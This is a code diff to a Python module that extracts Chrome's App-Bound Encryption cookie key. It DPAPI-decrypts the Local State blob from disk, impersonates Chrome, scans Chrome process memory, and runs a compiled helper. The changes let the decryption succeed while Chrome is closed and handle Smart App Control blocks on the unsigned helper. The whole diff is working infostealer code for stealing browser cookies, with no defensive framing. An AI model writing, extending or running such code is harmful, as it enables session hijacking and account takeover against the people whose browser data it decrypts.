@@ -2639,9 +2639,12 @@ def _dpapi_unprotect_ex(
         out_blob = DATA_BLOB()
         ent_ptr = None
         ent_hold = None
-        if entropy:
-            ent_hold = (ctypes.c_ubyte * len(entropy)).from_buffer_copy(entropy)
-            ent_blob = DATA_BLOB(len(entropy), ctypes.addressof(ent_hold))
+        if entropy is not None:
+            if entropy:
+                ent_hold = (ctypes.c_ubyte * len(entropy)).from_buffer_copy(entropy)
+                ent_blob = DATA_BLOB(len(entropy), ctypes.addressof(ent_hold))
+            else:
+                ent_blob = DATA_BLOB(0, None)
             ent_ptr = ctypes.byref(ent_blob)
         if not crypt32.CryptUnprotectData(
             ctypes.byref(in_blob),
@@ -2692,6 +2695,7 @@ def _dpapi_unprotect_local(blob: bytes) -> bytes | None:
     """User-context CryptUnprotectData on appb:dpapi:640 slices."""
     ents: list[bytes | None] = [
         None,
+        b"",
         b"Google Chrome",
         "Google Chrome".encode("utf-16-le"),
         b"Chromium",
@@ -3177,6 +3181,12 @@ def _join_abe_hr(parts: list[str]) -> str:
         text = (part or "").strip()
         if text and text not in out:
             out.append(text)
+    fp = str(_cache.get("_appb_fp") or "")
+    if fp and not any(fp in item for item in out):
+        if out:
+            out.insert(1, fp)
+        else:
+            out.append(fp)
     return _safe_snapshot_detail(";".join(out))[:80]
 
 
@@ -3370,7 +3380,7 @@ def _app_bound_layout_views(blob: bytes) -> tuple[str, list[bytes]]:
 
     add_all(blob)
     try:
-        inner = _dpapi_unprotect(blob)
+        inner = _dpapi_unprotect_local(blob)
     except Exception:  # noqa: BLE001 — keep appb:dpapi:N even if LocalFree overflows
         inner = None
     if inner:
@@ -3442,6 +3452,12 @@ def _cookie_key_from_unprotect_plain(
     """Inner payload after CryptUnprotect of appb:dpapi:640 → cookie AES key."""
     if not plain:
         return None
+    if _looks_like_dpapi(plain) or plain.startswith(b"APPB"):
+        nested = _dpapi_unprotect_local(plain)
+        if nested and nested != plain:
+            hit = _cookie_key_from_unprotect_plain(nested, v20_sample)
+            if hit:
+                return hit
     for cand in _plain_aes_keys(plain) + _aes_key_windows(plain):
         if _v20_key_ok(cand, v20_sample, all_blobs=True):
             return cand
@@ -3529,20 +3545,27 @@ def _impersonate_chrome_unprotect(blob: bytes) -> bytes | None:
 
 
 def _dpapi_unprotect_appb(blob: bytes) -> bytes | None:
-    """CryptUnprotect the 640-byte Local State APPB body. No CoCreate."""
+    """CryptUnprotect the 640-byte Local State APPB from disk. Chrome not required."""
     if not blob:
         return None
     try:
         current = blob
         last: bytes | None = None
+        pids: list[int] = []
+        try:
+            if os.name == "nt":
+                pids = _chrome_pids_prioritized()
+        except Exception:  # noqa: BLE001 — closed Chrome must not abort disk unwrap
+            pids = []
         for _ in range(4):
-            plain = (
-                _dpapi_unprotect_local(current)
-                or _impersonate_chrome_unprotect(current)
-                or _chrome_unprotect_data(current)
-            )
+            plain = _dpapi_unprotect_local(current)
+            if not plain and pids:
+                plain = (
+                    _impersonate_chrome_unprotect(current)
+                    or _chrome_unprotect_data(current)
+                )
             if not plain:
-                if last is None:
+                if last is None and pids:
                     return _chrome_unprotect_memory_blob(current)
                 return last
             last = plain
@@ -3670,16 +3693,27 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
         v20_sample = _resolve_v20_sample(v20_sample) or b""
         if not _valid_v20_sample(v20_sample):
             return None, _join_abe_hr(trail)
-    # Diagnose APPB and try layout-derived wrap keys before memscan.
+    # Disk APPB first. Closed Chrome is not a reason to stop.
+    blob = _app_bound_blob_bytes()
+    if blob:
+        fp, views = _app_bound_layout_views(blob)
+        _cache["_appb_fp"] = fp
+        _cache["_appb_views"] = views
     key = _static_app_bound_cookie_key(v20_sample)
     if _abe_proves_cookies(key, v20_sample):
         return key, "0x00000000"
-    # In-process memscan first. Unsigned helper is blocked by Smart App Control (4551).
-    key, hr = _memscan_abe_key(v20_sample)
-    if _abe_proves_cookies(key, v20_sample):
-        return key, "0x00000000"
-    if hr:
-        trail.append(hr)
+    pids: list[int] = []
+    if os.name == "nt":
+        try:
+            pids = _chrome_pids_prioritized()
+        except Exception:  # noqa: BLE001
+            pids = []
+    if pids:
+        key, hr = _memscan_abe_key(v20_sample)
+        if _abe_proves_cookies(key, v20_sample):
+            return key, "0x00000000"
+        if hr:
+            trail.append(hr)
     helper, compile_hr = _compiled_abe_helper_exe()
     if helper is None:
         trail.append(compile_hr or "csc_missing")
@@ -3695,7 +3729,7 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
                 return key, "0x00000000"
             if hr:
                 trail.append(hr)
-            if hr and "4551" in hr:
+            if hr and ("4551" in hr or "4556" in hr):
                 break
         if not ran:
             trail.append("helper:never_ran")
@@ -4638,7 +4672,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         return None, "memscan:no_ctypes"
     pids = _chrome_pids_prioritized()
     if not pids:
-        return None, "memscan:no_chrome"
+        return None, _join_abe_hr(["memscan:no_chrome"])
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
     kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
     kernel32.OpenProcess.restype = wintypes.HANDLE
